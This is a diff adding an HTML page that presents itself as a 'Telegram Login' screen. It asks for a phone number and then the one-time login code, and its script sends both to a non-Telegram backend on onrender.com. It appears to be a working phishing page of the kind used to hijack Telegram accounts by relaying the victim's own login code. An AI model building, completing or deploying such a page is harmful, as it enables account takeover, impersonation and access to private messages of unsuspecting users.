@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Telegram Login</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      background: #e6ecf0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .container {
+      background: white;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+      width: 320px;
+    }
+    input {
+      width: 100%;
+      padding: 10px;
+      margin-top: 10px;
+      margin-bottom: 20px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+    button {
+      width: 100%;
+      padding: 10px;
+      background: #0088cc;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    button:hover {
+      background: #007ab8;
+    }
+    #code-section {
+      display: none;
+    }
+    .message {
+      margin-top: 10px;
+      color: green;
+      font-size: 14px;
+    }
+    .error {
+      color: red;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Telegram Login</h2>
+    <input type="text" id="phone" placeholder="+91XXXXXXXXXX" />
+    <button id="sendCodeBtn">Next</button>
+
+    <div id="code-section">
+      <input type="text" id="code" placeholder="Enter OTP Code" />
+      <button id="verifyCodeBtn">Verify</button>
+    </div>
+
+    <div id="message" class="message"></div>
+  </div>
+
+  <script>
+    const backendURL = "https://telegram-backend-o5bg.onrender.com";
+
+    document.getElementById("sendCodeBtn").onclick = async function () {
+      const phone = document.getElementById("phone").value;
+      const message = document.getElementById("message");
+      message.textContent = "";
+      try {
+        const res = await fetch(backendURL + "/send-code", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ phone }),
+        });
+        const data = await res.json();
+        if (data.success) {
+          document.getElementById("code-section").style.display = "block";
+          message.textContent = "Code sent. Please enter OTP.";
+          message.classList.remove("error");
+        } else {
+          message.textContent = "Error sending code.";
+          message.classList.add("error");
+        }
+      } catch (e) {
+        message.textContent = "Network error: " + e.message;
+        message.classList.add("error");
+      }
+    };
+
+    document.getElementById("verifyCodeBtn").onclick = async function () {
+      const phone = document.getElementById("phone").value;
+      const code = document.getElementById("code").value;
+      const message = document.getElementById("message");
+      message.textContent = "";
+      try {
+        const res = await fetch(backendURL + "/verify-code", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ phone, code }),
+        });
+        const data = await res.json();
+        if (data.success) {
+          message.textContent = "Login successful!";
+          message.classList.remove("error");
+        } else {
+          message.textContent = "Invalid code.";
+          message.classList.add("error");
+        }
+      } catch (e) {
+        message.textContent = "Verification error: " + e.message;
+        message.classList.add("error");
+      }
+    };
+  </script>
+</body>
+</html>
